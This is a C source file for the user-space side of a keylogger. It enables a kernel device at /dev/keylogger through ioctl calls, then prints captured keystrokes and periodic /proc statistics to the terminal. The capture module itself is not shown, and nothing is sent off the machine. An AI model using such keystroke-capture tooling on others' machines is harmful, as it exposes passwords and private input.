// user/keylogger_app.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/ioctl.h>

#define DEV_PATH  "/dev/keylogger"
#define PROC_PATH "/proc/keylogger_stats"

#define KEYLOGGER_IOC_MAGIC 'k'
#define KEYLOGGER_IOC_RESET_STATS   _IO(KEYLOGGER_IOC_MAGIC, 0)
#define KEYLOGGER_IOC_CLEAR_BUFFER  _IO(KEYLOGGER_IOC_MAGIC, 1)
#define KEYLOGGER_IOC_ENABLE        _IO(KEYLOGGER_IOC_MAGIC, 2)
#define KEYLOGGER_IOC_DISABLE       _IO(KEYLOGGER_IOC_MAGIC, 3)

void *reader_thread(void *arg)
{
    int fd = open(DEV_PATH, O_RDONLY);
    char buf[64];
    ssize_t n;

    if (fd < 0) {
        perror("open /dev/keylogger");
        return NULL;
    }

    printf("[reader] Started. Waiting for keys...\n");

    while (1) {
        n = read(fd, buf, sizeof(buf));
        if (n < 0) {
            perror("read");
            break;
        } else if (n == 0) {
            // EOF
            break;
        } else {
            fwrite(buf, 1, n, stdout);
            fflush(stdout);
        }
    }

    close(fd);
    return NULL;
}

void *stats_thread(void *arg)
{
    char buf[256];

    while (1) {
        int fd = open(PROC_PATH, O_RDONLY);
        if (fd < 0) {
            perror("open /proc/keylogger_stats");
            sleep(2);
            continue;
        }

        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);

        if (n > 0) {
            buf[n] = '\0';
            printf("\n[stats]\n%s\n", buf);
        }

        sleep(2);
    }

    return NULL;
}

int main(void)
{
    pthread_t t1, t2;
    int fd;

    fd = open(DEV_PATH, O_RDWR);
    if (fd < 0) {
        perror("open /dev/keylogger");
        return 1;
    }

    // Enable logging and clear stats at startup
    if (ioctl(fd, KEYLOGGER_IOC_ENABLE) < 0)
        perror("ioctl ENABLE");
    if (ioctl(fd, KEYLOGGER_IOC_RESET_STATS) < 0)
        perror("ioctl RESET_STATS");
    if (ioctl(fd, KEYLOGGER_IOC_CLEAR_BUFFER) < 0)
        perror("ioctl CLEAR_BUFFER");

    close(fd);

    if (pthread_create(&t1, NULL, reader_thread, NULL) != 0) {
        perror("pthread_create reader");
        return 1;
    }

    if (pthread_create(&t2, NULL, stats_thread, NULL) != 0) {
        perror("pthread_create stats");
        return 1;
    }

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    return 0;
}
